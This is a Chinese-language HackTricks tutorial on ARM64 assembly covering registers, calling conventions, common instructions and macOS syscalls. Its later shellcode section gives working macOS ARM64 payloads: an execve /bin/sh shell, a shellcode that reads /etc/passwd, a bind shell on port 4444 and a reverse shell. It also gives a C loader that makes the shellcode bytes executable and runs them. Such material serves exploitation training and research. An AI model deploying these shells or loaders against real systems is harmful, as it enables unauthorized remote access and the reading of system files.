# ARM64基础汇编

<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **ARM64简介**

ARM64，也称为ARMv8-A，是一种64位处理器架构，用于各种类型的设备，包括智能手机、平板电脑、服务器，甚至一些高端个人电脑（macOS）。它是ARM控股公司的产品，该公司以其节能的处理器设计而闻名。

### **寄存器**

ARM64有**31个通用寄存器**，标记为`x0`至`x30`。每个可以存储**64位**（8字节）的值。对于只需要32位值的操作，可以使用w0至w30的名称以32位模式访问相同的寄存器。

1. **`x0`** 至 **`x7`** - 这些通常用作临时寄存器，用于向子程序传递参数。
* **`x0`** 还携带函数的返回数据
2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中使用的是x16！**
3. **`x9`** 至 **`x15`** - 更多的临时寄存器，常用于局部变量。
4. **`x16`** 和 **`x17`** - 临时寄存器，也用于间接函数调用和PLT（程序链接表）存根。
* **`x16`** 用作**`svc`** 指令的**系统调用号**。
5. **`x18`** - 平台寄存器。在某些平台上，此寄存器保留供平台特定用途。
6. **`x19`** 至 **`x28`** - 这些是被调用者保存的寄存器。函数必须为其调用者保留这些寄存器的值。
7. **`x29`** - **帧指针**。
8. **`x30`** - 链接寄存器。当执行`BL`（带链接的分支）或`BLR`（带链接到寄存器的分支）指令时，它保存返回地址。
9. **`sp`** - **栈指针**，用于跟踪栈顶。
10. **`pc`** - **程序计数器**，指向下一条要执行的指令。

### **调用约定**

ARM64调用约定规定，函数的**前八个参数**通过寄存器**`x0`至`x7`**传递。**额外的**参数通过**栈**传递。**返回**值通过寄存器**`x0`**返回，如果是128位的话，也可以通过**`x1`**返回。**`x19`**至**`x30`**和**`sp`**寄存器必须在函数调用中被**保留**。

阅读汇编中的函数时，寻找**函数序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**，**设置**新的**帧指针**，和**分配栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。

### Swift中的调用约定

Swift有其自己的**调用约定**，可以在[**这里找到**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

### **常用指令**

ARM64指令通常具有**格式`opcode dst, src1, src2`**，其中**`opcode`**是要执行的**操作**（如`add`、`sub`、`mov`等），**`dst`**是将存储结果的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。立即数也可以代替源寄存器使用。

* **`mov`**: **移动**一个值从一个**寄存器**到另一个。
* 示例：`mov x0, x1` — 这将`x1`中的值移动到`x0`中。
* **`ldr`**: **从内存加载**一个值到**寄存器**中。
* 示例：`ldr x0, [x1]` — 这将`x1`指向的内存位置的值加载到`x0`中。
* **`str`**: **将寄存器中的值存储**到**内存**中。
* 示例：`str x0, [x1]` — 这将`x0`中的值存储到`x1`指向的内存位置。
* **`ldp`**: **加载寄存器对**。此指令**从连续的内存位置加载两个寄存器**。内存地址通常通过向另一个寄存器的值添加偏移量来形成。
* 示例：`ldp x0, x1, [x2]` — 这将`x0`和`x1`从`x2`和`x2 + 8`的内存位置加载。
* **`stp`**: **存储寄存器对**。此指令**将两个寄存器存储到连续的内存位置**。内存地址通常通过向另一个寄存器的值添加偏移量来形成。
* 示例：`stp x0, x1, [x2]` — 这将`x0`和`x1`存储到`x2`和`x2 + 8`的内存位置。
* **`add`**: **将两个寄存器的值相加**并将结果存储在寄存器中。
* 示例：`add x0, x1, x2` — 这将`x1`和`x2`中的值相加并将结果存储在`x0`中。
* **`sub`**: **从一个寄存器中减去另一个寄存器的值**并将结果存储在寄存器中。
* 示例：`sub x0, x1, x2` — 这将`x2`中的值从`x1`中减去并将结果存储在`x0`中。
* **`mul`**: **将两个寄存器的值相乘**并将结果存储在寄存器中。
* 示例：`mul x0, x1, x2` — 这将`x1`和`x2`中的值相乘并将结果存储在`x0`中。
* **`div`**: **将一个寄存器的值除以另一个**并将结果存储在寄存器中。
* 示例：`div x0, x1, x2` — 这将`x1`中的值除以`x2`并将结果存储在`x0`中。
* **`bl`**: **带链接的分支**，用于**调用**一个**子程序**。将**返回地址存储在`x30`**中。
* 示例：`bl myFunction` — 这将调用函数`myFunction`并将返回地址存储在`x30`中。
* **`blr`**: **带链接到寄存器的分支**，用于**调用**一个目标在**寄存器中指定**的**子程序**。将返回地址存储在`x30`中。
* 示例：`blr x1` — 这将调用地址包含在`x1`中的函数并将返回地址存储在`x30`中。
* **`ret`**: **从子程序返回**，通常使用**`x30`**中的地址。
* 示例：`ret` — 这将使用`x30`中的返回地址从当前子程序返回。
* **`cmp`**: **比较两个寄存器**并设置条件标志。
* 示例：`cmp x0, x1` — 这将比较`x0`和`x1`中的值并相应地设置条件标志。
* **`b.eq`**: **如果相等则分支**，基于之前的`cmp`指令。
* 示例：`b.eq label` — 如果之前的`cmp`指令发现两个相等的值，这将跳转到`label`。
* **`b.ne`**: **如果不相等则分支**。此指令检查条件标志（由之前的比较指令设置），如果比较的值不相等，它将分支到一个标签或地址。
* 示例：在`cmp x0, x1`指令之后，`b.ne label` — 如果`x0`和`x1`中的值不相等，这将跳转到`label`。
* **`cbz`**: **比较并在零时分支**。此指令将寄存器与零进行比较，如果它们相等，它将分支到一个标签或地址。
* 示例：`cbz x0, label` — 如果`x0`中的值为零，这将跳转到`label`。
* **`cbnz`**: **比较并在非零时分支**。此指令将寄存器与零进行比较，如果它们不相等，它将分支到一个标签或地址。
* 示例：`cbnz x0, label` — 如果`x0`中的值非零，这将跳转到`label`。
* **`adrp`**: 计算符号的**页面地址**并将其存储在寄存器中。
* 示例：`adrp x0, symbol` — 这将计算`symbol`的页面地址并将其存储在`x0`中。
* **`ldrsw`**: **从内存加载**一个有符号的**32位**值并将其**符号扩展到64**位。
* 示例：`ldrsw x0, [x1]` — 这将从`x1`指向的内存位置加载一个有符号的32位值，将其符号扩展到64位，并将其存储在`x0`中。
* **`stur`**: **将寄存器值存储到内存位置**，使用另一个寄存器的偏移量。
* 示例：`stur x0, [x1, #4]` — 这将`x0`中的值存储到内存地址中，该地址比`x1`中当前的地址大4字节。
* &#x20;**`svc`** : 发起一个**系统调用**。它代表"Supervisor Call"。当处理器执行此指令时，它**从用户模式切换到内核模式**并跳转到内存中的特定位置，那里是**内核的系统调用处理**代码所在。
*   示例：&#x20;

```armasm
mov x8, 93  ; 将退出的系统调用号（93）加载到寄存器x8中。
mov x0, 0   ; 将退出状态码（0）加载到寄存器x0中。
svc 0       ; 发起系统调用。
```

### **函数序言**

1.  **将链接寄存器和帧指针保存到栈中**：

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; 将x29和x30对存储到栈中并递减栈指针
```
{% endcode %}
2. **设置新的帧指针**: `mov x29, sp` (为当前函数设置新的帧指针)
3. **为局部变量在栈上分配空间**（如果需要）: `sub sp, sp, <size>`（其中`<size>`是所需的字节数）

### **函数尾声**

1. **释放局部变量空间**（如果分配了的话）: `add sp, sp, <size>`
2.  **恢复链接寄存器和帧指针**：

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; 从栈中加载x29和x30对并递增栈指针
```
{% endcode %}
3. **返回**: `ret` (使用链接寄存器中的地址将控制权返回给调用者)

## macOS

### BSD系统调用

查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD系统调用将有**x16 > 0**。

### Mach陷阱

查看[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)。Mach陷阱将有**x16 < 0**，所以你需要用**负数**调用前面列表中的数字：**`_kernelrpc_mach_vm_allocate_trap`** 是 **`-10`**。

你也可以在反汇编器中检查**`libsystem_kernel.dylib`**来找到如何调用这些（和BSD）系统调用：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
有时候检查 **`libsystem_kernel.dylib`** 中的**反编译**代码比检查**源代码**要容易，因为许多系统调用（BSD和Mach）的代码是通过脚本生成的（查看源代码中的注释），而在dylib中你可以找到正在被调用的内容。
{% endhint %}

### Shellcodes

编译方法：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>C代码用于测试shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行了解释。

{% tabs %}
{% tab title="使用 adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="使用栈" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是参数数组（在内存中，这意味着地址的堆栈）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 通过 fork 调用 sh 命令，这样主进程不会被终止
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### 绑定 Shell

绑定 Shell 来自 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 在 **端口 4444**上
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 反向 shell

来自 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)，revshell 至 **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
